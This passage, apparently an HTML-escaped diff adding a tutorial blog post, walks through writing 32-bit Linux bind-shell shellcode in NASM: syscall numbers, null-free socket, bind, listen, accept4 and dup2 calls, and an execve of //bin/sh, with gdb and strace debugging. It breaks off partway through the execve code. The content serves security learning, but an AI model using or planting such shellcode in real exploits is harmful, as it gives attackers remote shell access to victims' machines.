+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+&lt;p&gt;Right so our C version is working, the code is pretty well commented but it is
+clear that there is no error checking and also that there are LOTS of constants
+that we wont have when we come to write this in assembly. These are&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;syscall numbers (as C provides convenience functions for these)&lt;/li&gt;
+  &lt;li&gt;AF_INET - The protocol family&lt;/li&gt;
+  &lt;li&gt;SOCK_STREAM - Used for TCP connection&lt;/li&gt;
+  &lt;li&gt;INADDR_ANY - Used to tell OS to listen on all addresses&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;We also need to figure out how the sockaddr_in structure needs to look on the
+stack&lt;/p&gt;
+
+&lt;h1 id=&quot;information-gathering&quot;&gt;Information Gathering&lt;/h1&gt;
+
+&lt;h2 id=&quot;syscall-numbers&quot;&gt;1. Syscall Numbers&lt;/h2&gt;
+&lt;p&gt;Lets gather all the syscall numbers. For this installed the libc6-dev-i386
+package on my 64bit kali vm. This installs the linux headers into /usr/include.
+This include file we are specifically interested in for the syscall numbers is 
+/usr/include/asm/unistd_32.h a quick grep through this yields the following
+syscall numbers&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;#define __NR_socket 359
+#define __NR_bind 361
+#define __NR_listen 363
+#define __NR_accept4 364
+#define __NR_dup2 63
+#define __NR_execve 11
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+&lt;p&gt;&lt;em&gt;Note: There is an x86 specific syscall called socketcall and is number 102
+which a lot of people use when producing this type of shellcode but I have
+decided to use the individual calls.&lt;/em&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;constants&quot;&gt;Constants&lt;/h2&gt;
+&lt;p&gt;Right, we now have all our syscall numbers time to gather all of our other
+constants. Lets take a grep through the header files&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  $ grep -r AF_INET /usr/include/**/*.h
+/usr/include/bits/socket.h:#define AF_INET              PF_INET
+/usr/include/bits/socket.h:#define AF_INET6     PF_INET6
+/usr/include/linux/if_link.h: *       [AF_INET] = {
+/usr/include/linux/if_link.h: *       [AF_INET6] = {
+/usr/include/linux/in6.h: *     Types and definitions for AF_INET6
+/usr/include/linux/in6.h:       unsigned short int      sin6_family;    /* AF_INET6 */
+/usr/include/linux/l2tp.h:      __kernel_sa_family_t l2tp_family; /* AF_INET */
+/usr/include/linux/l2tp.h:      __kernel_sa_family_t l2tp_family; /* AF_INET6 */
+/usr/include/X11/Xdmcp.h:#if defined(IPv6) &amp;amp;&amp;amp; defined(AF_INET6)
+
+  $ grep -r PF_INET /usr/include/**/*.h
+/usr/include/bits/socket.h:#define PF_INET              2       /* IP protocol family.  */
+/usr/include/bits/socket.h:#define PF_INET6     10      /* IP version 6.  */
+/usr/include/bits/socket.h:#define AF_INET              PF_INET
+/usr/include/bits/socket.h:#define AF_INET6     PF_INET6
+
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+&lt;p&gt;As you can see from above AF_INET is aliased to PF_INET so a quick search
+reveals AF_INET = 2. If we continue grepping for the other constants we find
+that SOCK_STREAM = 1 and INADDR_ANY = 0&lt;/p&gt;
+
+&lt;h1 id=&quot;syscalls-from-assembly&quot;&gt;Syscalls from Assembly&lt;/h1&gt;
+&lt;p&gt;Before we head off on this trip lets remind our selves of how syscalls happen
+from assembly. Below is the order of business&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;Put the syscall number in the eax register&lt;/li&gt;
+  &lt;li&gt;Setup the syscall params using EBX, ECX and EDX, syscalls with more params
+either use the stack or other registers sucj as ESI&lt;/li&gt;
+  &lt;li&gt;Call interupt 0x80 to trigger the call&lt;/li&gt;
+  &lt;li&gt;Results of the syscall gets returned in EAX&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;Lets also refresh ourselves on the desired characteristics of our shellcode&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;Small as possible (this means being crafty with params etc)&lt;/li&gt;
+  &lt;li&gt;No bad chars such as NULL (meaning we want to use the appropriate registers)&lt;/li&gt;
+  &lt;li&gt;Port numbers need to be in Network byte order or Big Endian&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h1 id=&quot;lets-begin&quot;&gt;Lets Begin&lt;/h1&gt;
+
+&lt;p&gt;First thing we going to need to do is zero out our registers so we have a clean
+slate&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-nasm&quot; data-lang=&quot;nasm&quot;&gt;        &lt;span class=&quot;k&quot;&gt;xor&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;eax&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;eax&lt;/span&gt;            &lt;span class=&quot;c&quot;&gt;; Zero out registers&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;xor&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ebx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ebx&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;xor&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ecx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ecx&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;xor&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;edx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;edx&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;With that out the way lets now take a look at the socket syscall docs (link
+above)&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  sockfd = socket(int socket_family, int socket_type, int protocol);
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+&lt;p&gt;Right so the registers need to be as follows&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;EAX: 359 for socket syscall (see above)&lt;/li&gt;
+  &lt;li&gt;EBX: 2 for AF_INET (1st param)&lt;/li&gt;
+  &lt;li&gt;ECX: 1 for SOCK_STREAM (2nd param)&lt;/li&gt;
+  &lt;li&gt;EDX: 0 for IP (3rd param which is already set via xor above)&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;If all goes well we should get a file descriptor to a sock back in EAX. Heres
+the code&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-nasm&quot; data-lang=&quot;nasm&quot;&gt;        &lt;span class=&quot;k&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;bl&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x2&lt;/span&gt;             &lt;span class=&quot;c&quot;&gt;; AF_INET&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;inc&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cl&lt;/span&gt;                  &lt;span class=&quot;c&quot;&gt;; SOCK_STREAM = 1 - Leave EDX 0 for IP&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ax&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x0167&lt;/span&gt;          &lt;span class=&quot;c&quot;&gt;; Socket syscall number&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x80&lt;/span&gt;                &lt;span class=&quot;c&quot;&gt;; make call&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Notice how we used the 8 bit versions of EBX and ECX to avoid NULLs and also how
+we used “inc cl” to save a byte as apposed to a mov instruction. We used the 16
+bit version of EAX to avoid NULL and because 0x167 in hex (359 dec) needs two
+bytes.&lt;/p&gt;
+
+&lt;p&gt;So at this point we are assuming everything went ok (we are writing shellcode
+and we cant spare the bytes for error checking) which means that there should be
+a socket file descriptor sat in EAX waitning for us, the problem is we need EAX
+for our next syscall so we shall have to save it somewhere! Lets use EDI&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-nasm&quot; data-lang=&quot;nasm&quot;&gt;        &lt;span class=&quot;k&quot;&gt;xchg&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;edi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;eax&lt;/span&gt;           &lt;span class=&quot;c&quot;&gt;; store socketfd&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;I used xchg here to save a byte and I chose EDI so I didnt have to reset ESI for
+the accept4 call later (I will explain more on this later)&lt;/p&gt;
+
+&lt;p&gt;Now that is out of the way we need to set up the bind syscall, we have the
+syscall number and the address familly constants all worked out for this but we
+now need to figure out how the sockaddr_in structure looks on the stack. First
+let us remind our selves how sockaddr_in looks in C&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  struct sockaddr_in {  
+    short sin_family;  
+    unsigned short sin_port;  
+    struct in_addr sin_addr;  
+    char sin_zero[8];  
+  };  
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+&lt;p&gt;So we need sin_family which if you remember the C version is just AF_INET then
+we need the port which has to be in network byte order. We are using port 5000
+which is 0x1388 in hex so network byte order would be 0x8813. The next parameter
+is the IP address structure which contains the IP to bind to, since we are
+binding to all IP’s using INADDR_ANY which is 0 then this value can be zero.
+Next is the interesting value which is the sin_zero field now according to the
+documentation this field is “Padding to make structure the same size as
+SOCKADDR” which means we dont need to bother setting it so our structure on the
+stack will be&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;High Mem: 0x00000002   ; sin_family (AF_INET)
+          0x8813       ; sin_port (Network Byte Order)
+ Low Mem: 0x00000000   ; sin_addr (INADDR_ANY)
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+&lt;p&gt;Remeber as this is the stack we have to push things on in reverse order. Lets
+look at the bind call args again just to remind ourselves.&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;int bind(int sockfd, const struct sockaddr *addr, socklen_t addrlen);
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+&lt;p&gt;Ok so we need EBX to point to the server socket handle (currently in EDI), we
+need a pointer to our sockaddr_in structure we put on the stack in ECX and then
+we need the size of the structure in EDX which can be computed as 2 bytes for
+AF_INET (short) 2 bytes for the port, 4 bytes for the long (inet address) then 8
+bytes for the padding which adds up to 16 bytes or 0x10&lt;/p&gt;
+
+&lt;p&gt;So lets get this all set up&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-nasm&quot; data-lang=&quot;nasm&quot;&gt;        &lt;span class=&quot;c&quot;&gt;; Now call bind&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;push&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;edx&lt;/span&gt;                &lt;span class=&quot;c&quot;&gt;; INADDR_ANY - IP to bind to in soccaddr_in&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;push&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;word&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x8813&lt;/span&gt;        &lt;span class=&quot;c&quot;&gt;; Port in Network byte order&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;push&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;word&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;bx&lt;/span&gt;            &lt;span class=&quot;c&quot;&gt;; Address Family AF_INET&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ecx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;esp&lt;/span&gt;            &lt;span class=&quot;c&quot;&gt;; get pointer to structure&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;xchg&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ebx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;edi&lt;/span&gt;           &lt;span class=&quot;c&quot;&gt;; put server socket fd into ebx (use xchg to save a byte)&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;dl&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x10&lt;/span&gt;            &lt;span class=&quot;c&quot;&gt;; set struct len&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ax&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x0169&lt;/span&gt;          &lt;span class=&quot;c&quot;&gt;; bind syscall&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x80&lt;/span&gt;                &lt;span class=&quot;c&quot;&gt;; make call&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Hopefully this makes sense first we have 3 pushes which set up our sockaddr_in
+struct on the stack, third push pushes the EBX register which already contains
+0x2 for AF_INET. Whe then move value of the stack pointer into ECX so we now
+have a pointer to our structure. Next we use xchg to get the socket handle from
+edi into EBX we then move the struct length of 16 bytes into EDX. Lastly we
+setup the bind syscall and execute it.&lt;/p&gt;
+
+&lt;p&gt;Now we have to call the listen call. Listen has the following signature.&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;int listen(int sockfd, int backlog);
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+&lt;p&gt;As EBX is already set to the server socket fd we only have to set ECX to a
+sensible value as it currently a pointer to a sockaddr_in struct. We achieve
+this by xchg ing ECX and EDX as EDX has the value 16 which is an acceptable
+value for the backlog parameter.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-nasm&quot; data-lang=&quot;nasm&quot;&gt;        &lt;span class=&quot;c&quot;&gt;; Call listen&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;xchg&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ecx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;edx&lt;/span&gt;           &lt;span class=&quot;c&quot;&gt;; set up the backlog parameter&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ax&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x016B&lt;/span&gt;          &lt;span class=&quot;c&quot;&gt;; set syscall number for listen&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x80&lt;/span&gt;                &lt;span class=&quot;c&quot;&gt;; make the call&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Time to move on, next up we want to call accept (or accept4 in our case). Lets
+have a look at the signature for this call&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;int accept4(int sockfd, struct sockaddr *addr, socklen_t *addrlen, int flags);
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+&lt;p&gt;So breaking this down we want&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;EBX to be the socket fd we are accepting connections from&lt;/li&gt;
+  &lt;li&gt;ECX to be a pointer to the struct that will get filled with the client address&lt;/li&gt;
+  &lt;li&gt;EDX to be the lenth of the structure&lt;/li&gt;
+  &lt;li&gt;ESI to be the flags setting&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;In our code EBX is already set up, we dont care about the client address so ECX
+and EDX can be 0x0 although I dont zero out EDX as it seems to be ignored when
+ECX points nowhere. Now how did I find that ESI was used for the flags
+parameter? I googled and could not find what I wanted and I was too lazy to go
+digging in the kernel source. As it turns out when I coded the inital socket
+call I originally used ESI to store the server socket fd in so when i did the
+xchg with EBX to setup the call to bind this meant ESI now had the value 0x2.
+When I had completed my code I found it failed on the accept call. I ran the
+tool with a cool linux debugging tool called strace and below is the output&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  $ strace ./bind
+execve(&quot;./bind&quot;, [&quot;./bind&quot;], [/* 21 vars */]) = 0
+strace: [ Process PID=2852 runs in 32 bit mode. ]
+socket(AF_INET, SOCK_STREAM, IPPROTO_IP) = 3
+bind(3, {sa_family=AF_INET, sin_port=htons(5000), sin_addr=inet_addr(&quot;0.0.0.0&quot;)}, 16) = 0
+listen(3, 16)                           = 0
+accept4(3, NULL, 0xffb21478, 0x2 /* SOCK_??? */) = -1 EINVAL (Invalid argument)
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+&lt;p&gt;This told me all my other parameters were correct I just needed find where the
+flags parameter was being set so I turned to trusty old GDB&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; $ gdb -q ./bind
+Reading symbols from ./bind...(no debugging symbols found)...done.
+(gdb) break _start
+Breakpoint 1 at 0x8048060
+(gdb) run
+Starting program: /root/src/bind
+
+Breakpoint 1, 0x08048060 in _start ()
+(gdb) disassemble
+Dump of assembler code for function _start:
+=&amp;gt; 0x08048060 &amp;lt;+0&amp;gt;:     xor    %eax,%eax
+   0x08048062 &amp;lt;+2&amp;gt;:     xor    %ebx,%ebx
+   0x08048064 &amp;lt;+4&amp;gt;:     xor    %ecx,%ecx
+   0x08048066 &amp;lt;+6&amp;gt;:     xor    %edx,%edx
+   0x08048068 &amp;lt;+8&amp;gt;:     mov    $0x2,%bl
+   0x0804806a &amp;lt;+10&amp;gt;:    inc    %cl
+   0x0804806c &amp;lt;+12&amp;gt;:    mov    $0x167,%ax
+   0x08048070 &amp;lt;+16&amp;gt;:    int    $0x80
+   0x08048072 &amp;lt;+18&amp;gt;:    xchg   %eax,%esi
+   0x08048073 &amp;lt;+19&amp;gt;:    push   %edx
+   0x08048074 &amp;lt;+20&amp;gt;:    pushw  $0x8813
+   0x08048078 &amp;lt;+24&amp;gt;:    push   %bx
+   0x0804807a &amp;lt;+26&amp;gt;:    mov    %esp,%ecx
+   0x0804807c &amp;lt;+28&amp;gt;:    xchg   %ebx,%esi
+   0x0804807e &amp;lt;+30&amp;gt;:    mov    $0x10,%dl
+   0x08048080 &amp;lt;+32&amp;gt;:    mov    $0x169,%ax
+   0x08048084 &amp;lt;+36&amp;gt;:    int    $0x80
+   0x08048086 &amp;lt;+38&amp;gt;:    xchg   %ecx,%edx
+   0x08048088 &amp;lt;+40&amp;gt;:    mov    $0x16b,%ax
+   0x0804808c &amp;lt;+44&amp;gt;:    int    $0x80
+   0x0804808e &amp;lt;+46&amp;gt;:    xor    %ecx,%ecx
+   0x08048090 &amp;lt;+48&amp;gt;:    mov    $0x16c,%ax
+   0x08048094 &amp;lt;+52&amp;gt;:    int    $0x80
+   0x08048096 &amp;lt;+54&amp;gt;:    xchg   %eax,%ebx
+   0x08048097 &amp;lt;+55&amp;gt;:    mov    $0x2,%cl
+End of assembler dump.
+(gdb) break *0x08048094
+Breakpoint 2 at 0x8048094
+(gdb) c
+Continuing.
+
+Breakpoint 2, 0x08048094 in _start ()
+(gdb) info registers
+eax            0x16c    364
+ecx            0x0      0
+edx            0xffffd6f8       -10504
+ebx            0x3      3
+esp            0xffffd6f8       0xffffd6f8
+ebp            0x0      0x0
+esi            0x2      2
+edi            0x0      0
+eip            0x8048094        0x8048094 &amp;lt;_start+52&amp;gt;
+eflags         0x246    [ PF ZF IF ]
+cs             0x23     35
+ss             0x2b     43
+ds             0x2b     43
+es             0x2b     43
+fs             0x0      0
+gs             0x0      0
+(gdb)
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+&lt;p&gt;see the 0x2 in ESI? I set that to 0 and boom! my accept call was working&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;(gdb) set $esi = 0
+(gdb) c
+Continuing.
+
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+&lt;p&gt;The program is now waiting for connections. I now can either xor ESI or use EDI to store the
+server socket fd. I chose to use EDI instead however on second thoughts the
+program this shellcode may be instered into may have already set ESI so its best
+to xor it lets look at the code for the accept call&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-nasm&quot; data-lang=&quot;nasm&quot;&gt;        &lt;span class=&quot;k&quot;&gt;xor&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ecx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ecx&lt;/span&gt;            &lt;span class=&quot;c&quot;&gt;; zero out registers&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;xor&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;esi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;esi&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ax&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x016c&lt;/span&gt;          &lt;span class=&quot;c&quot;&gt;; set accept syscall&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x80&lt;/span&gt;                &lt;span class=&quot;c&quot;&gt;; make the call&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;xchg&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ebx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;eax&lt;/span&gt;           &lt;span class=&quot;c&quot;&gt;; store the client socket fd in ebx so we can use for the dup call&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Notice how I use xchg to store the return value of accept (which is the client
+socket fd) into EBX which will be the first parameter for the three dup2 calls
+which have to come next&lt;/p&gt;
+
+&lt;p&gt;Right on to the dup2 calls, here we have to redirect our processes STDIN, STDOUT
+and STDERR to the client socket which we shall achieve using dup2. Observant
+reader might realize that STDIN, STDOUT and STDERR have the values 0, 1 &amp;amp; 2 and
+calling dup2 sounds a lot like a job for a loop. So here what we shall do is set
+the counter register (ECX) to 0x2 perform the dup2 call then decrement ECX if
+the sign flag has not been set (ECX is stil &amp;gt;= 0) then we shall loop around
+again calling the dup2 again. This should end up making the following dup 2
+calls.&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;dup2(4, 2)&lt;/li&gt;
+  &lt;li&gt;dup2(4, 1)&lt;/li&gt;
+  &lt;li&gt;dup2(4, 0)&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;These three calls will redirect our STDIN, STDOUT and STDERR to the client
+socket. Here is the code&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-nasm&quot; data-lang=&quot;nasm&quot;&gt;        &lt;span class=&quot;k&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cl&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x2&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;loop&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;al&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x3f&lt;/span&gt;            &lt;span class=&quot;c&quot;&gt;; setup dup2 call&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x80&lt;/span&gt;                &lt;span class=&quot;c&quot;&gt;; call dup2&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;dec&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ecx&lt;/span&gt;                 &lt;span class=&quot;c&quot;&gt;; decrement the loop counter&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;jns&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;loop&lt;/span&gt;                &lt;span class=&quot;c&quot;&gt;; if the sign flag is not set then repeat the loop&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Last thing to do is to make the execve call and then were done. Lets look at the
+execve signature&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;int execve(const char *filename, char *const argv[], char *const envp[]);
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+&lt;p&gt;Here is how we want the registers to look&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;EBX: pointer to the NULL terminated string “//bin/sh”&lt;/li&gt;
+  &lt;li&gt;ECX: pointer to an array containing the aruments to the program (includes
+//bin/sh string itself)&lt;/li&gt;
+  &lt;li&gt;EDX: NULL as we are not going to pass any environment to the shell&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;A couple of points to note for this are&lt;/p&gt;
+&lt;ol&gt;
+  &lt;li&gt;Its easier to push strings if they are multiples of 4 in length which is why
+we use //bin/sh as it is 8 characters in length and linux doesnt care about the
+extra /&lt;/li&gt;
+  &lt;li&gt;We have to push the string on the stack in reverse so we push hs/nib//&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;p&gt;Here is the code&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-nasm&quot; data-lang=&quot;nasm&quot;&gt;        &lt;span class=&quot;k&quot;&gt;push&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;eax&lt;/span&gt;                &lt;span class=&quot;c&quot;&gt;; push NULL onto stack to termins //bin/sh&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;push&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x68732f6e&lt;/span&gt;         &lt;span class=&quot;c&quot;&gt;; push //bin/sh in reverse onto the stack&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;push&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x69622f2f&lt;/span&gt;         &lt;span class=&quot;c&quot;&gt;; see above&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;mov&lt;/span&gt;  &lt;span class=&quot;n&quot;&gt;ebx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;esp&lt;/span&gt;           &lt;span class=&quot;c&quot;&gt;; move address of //bin/sh into EBX (execve's 1st parameter)&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;push&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;eax&lt;/span&gt;                &lt;span class=&quot;c&quot;&gt;; this serves two purposes 1, to use for EDX (we will pass no&lt;/span&gt;
+                                &lt;span class=&quot;c&quot;&gt;; environment to the shell and also as part of the array of&lt;/span&gt;
+                                &lt;span class=&quot;c&quot;&gt;; args that we will pass to as the 2nd arg of execve&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;mov&lt;/span&gt;  &lt;span class=&quot;n&quot;&gt;edx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;esp&lt;/span&gt;           &lt;span class=&quot;c&quot;&gt;; see above&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;push&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ebx&lt;/span&gt;                &lt;span class=&quot;c&quot;&gt;; ESP now points to and array of args [address of //bin/sh, 0x00]&lt;/span&gt;
+                                &lt;span class=&quot;c&quot;&gt;; these will act as the args to //bin/sh&lt;/span&gt;
